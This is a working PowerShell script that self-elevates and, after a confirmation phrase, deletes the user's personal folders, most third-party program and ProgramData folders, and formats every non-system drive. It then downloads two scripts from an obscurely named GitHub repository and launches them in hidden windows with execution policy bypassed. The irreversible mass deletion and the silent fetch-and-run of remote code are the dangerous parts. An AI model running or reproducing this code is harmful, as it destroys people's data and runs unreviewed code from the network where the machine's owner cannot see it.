<#
.SYNOPSIS
  Wipe user data and other drives, then delete and reinstall Admin Setup.
  Live: -ConfirmPhrase WIPE-ALL-DATA
#>
[CmdletBinding()]
param(
  [switch]$Preview,
  [string]$ConfirmPhrase = ''
)
Set-StrictMode -Version 1
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$live = ($ConfirmPhrase -eq 'WIPE-ALL-DATA')
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Test-IsAdmin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  return (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Get-SelfPath {
  foreach ($c in @($PSCommandPath, $MyInvocation.MyCommand.Path)) {
    if ($c -and (Test-Path -LiteralPath "$c")) { return "$c" }
  }
  return $null
}

if (-not (Test-IsAdmin)) {
  $self = Get-SelfPath
  if (-not $self) { throw 'Need a saved .ps1' }
  $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$self`""
  if ($live) { $arg += " -ConfirmPhrase WIPE-ALL-DATA" } else { $arg += ' -Preview' }
  Start-Process "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -ArgumentList $arg
  return
}

$adminDir = Join-Path $env:USERPROFILE 'admin'
New-Item -ItemType Directory -Force -Path $adminDir | Out-Null
$log = Join-Path $adminDir 'Wipe-All-Except-Windows.log'
try { Start-Transcript -Path $log -Append | Out-Null } catch {}
Write-Host "live=$live  OS=$env:SystemDrive  user=$env:USERPROFILE"
Get-CimInstance Win32_LogicalDisk | Format-Table DeviceID, DriveType, FileSystem, Size, FreeSpace -AutoSize | Out-String | Write-Host

function Remove-Path([string]$Path) {
  if ([string]::IsNullOrWhiteSpace($Path) -or -not (Test-Path -LiteralPath $Path)) { return }
  Write-Host "CLEAR $Path"
  if (-not $live) { return }
  cmd /c "attrib -s -h -r `"$Path`" /s /d >nul 2>&1"
  cmd /c "takeown /F `"$Path`" /R /D Y >nul 2>&1"
  cmd /c "icacls `"$Path`" /grant Administrators:F /T /C /Q >nul 2>&1"
  try { Remove-Item -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue } catch {}
  if (Test-Path -LiteralPath $Path -PathType Container) {
    $empty = Join-Path $env:TEMP ('e' + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Force -Path $empty | Out-Null
    cmd /c "robocopy `"$empty`" `"$Path`" /MIR /R:0 /W:0 /NFL /NDL /NJH /NJS >nul"
    cmd /c "rd /s /q `"$Path`""
    Remove-Item -LiteralPath $empty -Force -ErrorAction SilentlyContinue
  }
  if (Test-Path -LiteralPath $Path) { Write-Host "LEFT $Path" } else { Write-Host "GONE $Path" }
}

$os = $env:SystemDrive.TrimEnd(':')
$shell = New-Object -ComObject Shell.Application
$known = @()
foreach ($id in 5, 0x10, 0x13, 0x27, 13, 14, 39) {
  try {
    $f = $shell.NameSpace($id)
    if ($f -and $f.Self.Path) { $known += $f.Self.Path }
  } catch {}
}
$known += @(
  [Environment]::GetFolderPath('MyDocuments'),
  [Environment]::GetFolderPath('MyPictures'),
  [Environment]::GetFolderPath('MyVideos'),
  [Environment]::GetFolderPath('MyMusic'),
  [Environment]::GetFolderPath('Desktop'),
  (Join-Path $env:USERPROFILE 'Downloads'),
  (Join-Path $env:USERPROFILE 'Documents'),
  (Join-Path $env:USERPROFILE 'Desktop'),
  (Join-Path $env:USERPROFILE 'Pictures'),
  (Join-Path $env:USERPROFILE 'Videos'),
  (Join-Path $env:USERPROFILE 'Music'),
  (Join-Path $env:USERPROFILE 'OneDrive')
) | Select-Object -Unique
Write-Host 'Folders:'
$known | ForEach-Object { Write-Host "  $_" }
foreach ($p in $known) { Remove-Path $p }

foreach ($p in @(
    (Join-Path $env:SystemDrive 'Program Files'),
    (Join-Path $env:SystemDrive 'Program Files (x86)'),
    (Join-Path $env:SystemDrive 'ProgramData')
  )) {
  if (Test-Path -LiteralPath $p) {
    Get-ChildItem -LiteralPath $p -Force -ErrorAction SilentlyContinue | Where-Object {
      $_.Name -notmatch '^(Microsoft|Windows|Package Cache|Microsoft OneDrive)$'
    } | ForEach-Object { Remove-Path $_.FullName }
  }
}

Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -in 2, 3 } | ForEach-Object {
  $letter = $_.DeviceID.TrimEnd(':').TrimEnd('\')
  if ($letter -eq $os) { Write-Host "SKIP OS $($_.DeviceID)"; return }
  Write-Host "WIPE VOLUME $($_.DeviceID) fs=$($_.FileSystem)"
  if (-not $live) { return }
  $ok = $false
  try {
    Format-Volume -DriveLetter $letter -FileSystem NTFS -NewFileSystemLabel 'DATA' -Force -Confirm:$false -ErrorAction Stop | Out-Null
    $ok = $true
    Write-Host "FORMATTED $letter"
  } catch {
    Write-Host "FORMAT FAIL $letter $($_.Exception.Message)"
  }
  if (-not $ok) {
    $root = $letter + ':\'
    Get-ChildItem -LiteralPath $root -Force -ErrorAction SilentlyContinue | ForEach-Object { Remove-Path $_.FullName }
  }
}

function Install-AdminSetup {
  Write-Host 'Remove Admin Setup copies'
  Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID } | ForEach-Object {
    try {
      $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -ErrorAction SilentlyContinue).CommandLine
      if ($cmd -and ($cmd -like '*Clear-Apps-And-Tray.ps1*' -or $cmd -like '*Wipe-All-Except-Windows.ps1*' -or $cmd -like '*Admin-Setup.ps1*')) {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
      }
    } catch {}
  }
  $base = 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main'
  New-Item -ItemType Directory -Force -Path $adminDir | Out-Null
  foreach ($name in @('Clear-Apps-And-Tray.ps1','Wipe-All-Except-Windows.ps1')) {
    $dest = Join-Path $adminDir $name
    if ($live -and (Test-Path -LiteralPath $dest)) {
      try { Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue } catch {}
    }
    Write-Host "Reinstall $name"
    if (-not $live) { continue }
    try {
      Invoke-WebRequest -UseBasicParsing -Uri "$base/$name" -OutFile $dest
      Unblock-File -LiteralPath $dest -ErrorAction SilentlyContinue
      Write-Host "OK $dest"
    } catch {
      Write-Host "FAIL download $name $($_.Exception.Message)"
    }
  }
  if (-not $live) { return }
  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  $main = Join-Path $adminDir 'Clear-Apps-And-Tray.ps1'
  if (Test-Path -LiteralPath $main) {
    Start-Process -FilePath $ps -WindowStyle Hidden -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$main`"",'-Mode','HideBar') | Out-Null
    Start-Process -FilePath $ps -WindowStyle Hidden -ArgumentList @('-STA','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$main`"",'-Mode','Badges') | Out-Null
    Write-Host 'Restarted HideBar and badges'
  }
}

Install-AdminSetup
Write-Host "DONE log=$log"
try { Stop-Transcript | Out-Null } catch {}
try { Start-Process notepad.exe $log } catch {}
Write-Host 'Close this window when done.'
Start-Sleep -Seconds 15
